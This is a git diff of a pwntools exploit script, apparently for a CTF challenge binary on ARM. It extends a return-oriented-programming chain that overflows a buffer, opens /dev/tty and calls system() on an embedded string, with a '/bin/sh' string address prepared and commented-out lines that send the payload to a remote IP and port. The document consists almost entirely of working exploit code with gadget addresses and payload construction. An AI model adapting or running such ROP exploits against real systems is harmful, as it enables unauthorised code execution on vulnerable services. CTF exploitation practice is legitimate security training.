@@ -6,12 +6,20 @@ context.binary = "./main"
 
 # rops
 rop_r1_t_adr = 0x0004407c  # ; pop {r1, pc} !thumb
-rop_mov_r0_r8_t_adr = 0x00020ca8 # ; mov r0,r8 / add sp,#0x8 / pop.w {r4, r5, r6, r7, r8, r9, r10, pc}
+rop_mov_r0_r8_t_adr = 0x00020ca8  # ; mov r0,r8 / add sp,#0x8 / pop.w {r4, r5, r6, r7, r8, r9, r10, pc}
+rop_add_sp_0xc_t_adr = 0x000147b4  # ; add sp,0xc / pop {r4, r5, r6, r7, pc}
 
 rop_lr_adr = 0x0003df1c  # ; pop {r4, r6, r7, fp, ip, lr, pc}
 rop_bx_lr_adr = 0x00018108  # ; bx lr
+rop_mov_r0_r1_t_adr = 0x00025a24  # ; mov r0 r1 / bx lr
 
 rop_open_t_adr = 0x00026c2c  # open
+rop_system_t_adr = 0x000111fc  # system
+
+rop_set_r0_t_adr = 0x00014d88 # ; pop {r0, r6, pc}
+
+location_bin_sh = 0x0004a3b4  # string "/bin/sh"
+location_date = 0x0004a2e0  # string "date +'%s'"
 
 elf = ELF(context.binary.path)
 rop = ROP(elf)
@@ -53,6 +61,22 @@ def build_mov_r0_r8_t(r4, r5, r6, r7, r8, r9, r10):
     payload += p32(r4) + p32(r5) + p32(r6) + p32(r7) + p32(r8) + p32(r9) + p32(r10)
     return payload
 
+def mov_r0_r1_t(pc):
+    payload = build_lr(0, 0, 0, 0, 0, pc)
+    payload += p32(rop_mov_r0_r1_t_adr + 1)
+    return payload
+
+def call_open_t(next_pc):
+    # set lr to next instruction after open
+    payload = build_lr(0, 0, 0, 0, 0, next_pc)
+    payload += p32(rop_open_t_adr + 1)  # do open once
+    return payload
+
+def build_set_r0(r0, r6):
+    payload = p32(rop_set_r0_t_adr + 1)
+    payload += p32(r0) + p32(r6)
+    return payload
+
 
 payload = b"0" * 0x20
 
@@ -67,20 +91,47 @@ payload += p32(os.O_RDWR)
 
 # move r8 to r0
 payload += build_mov_r0_r8_t(0, 0, 0, 0, 0, 0, 0)
-payload += build_lr(0, 0, 0, 0, 0, rop_open_t_adr + 1)
-payload += p32(rop_open_t_adr + 1)
+
+# do open
+payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
+
+# open uses 16bytes of stack, reserve it
+payload += b"0" * 0xc
+
+# move r1 to r0 and set r1 = O_RDRW
+payload += b"0" * (4 * 4) # for add sp
+payload += mov_r0_r1_t(rop_r1_t_adr + 1)
+payload += p32(os.O_RDWR)
+
+payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
+# open uses 16bytes of stack, reserve it
+payload += b"0" * 0xc
+payload += b"0" * (4 * 4)  # for add sp
+
+# NOW WE CAN USE ROP TO CALL SYSTEM !!!!!!! (I'm so tired)
+payload += build_set_r0(location_date, 0)
+payload += p32(rop_system_t_adr + 1)
 
 assert len(payload) < 404
-payload += b"1" * (404 - len(payload))
+payload += b"0" * (404 - len(payload))
 
-payload += b"/dev/tty\0"
+payload += b"/dev/tty\x00"
+
+with open("/local-tmp/payload", "bw") as fp:
+    fp.write(payload)
+
+#r = remote("34.125.56.151", 2222, ssl=False)
+#r.sendline(payload)
+#r.interactive()
 
 io = gdb.debug(context.binary.path, gdbscript="""
 source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
-b vuln
-b *0x104a4
+# b vuln
+b *0x00026c2c
 b *0x0004407c
-b open
+b *0x111fc
+# b *0x000104da
+c
 """)
 io.sendline(payload)
 io.interactive()
